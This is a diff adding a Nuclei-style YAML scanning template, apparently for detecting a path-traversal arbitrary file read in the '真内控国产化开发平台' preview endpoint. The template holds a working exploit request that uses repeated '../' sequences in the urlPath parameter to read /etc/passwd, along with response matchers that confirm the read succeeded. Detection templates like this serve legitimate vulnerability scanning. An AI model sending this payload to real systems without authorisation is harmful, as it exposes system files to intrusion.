@@ -1,0 +1,29 @@
+id: poc-yaml-znk-preview-anyfile-read
+info:
+  name: 真内控国产化开发平台 preview 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
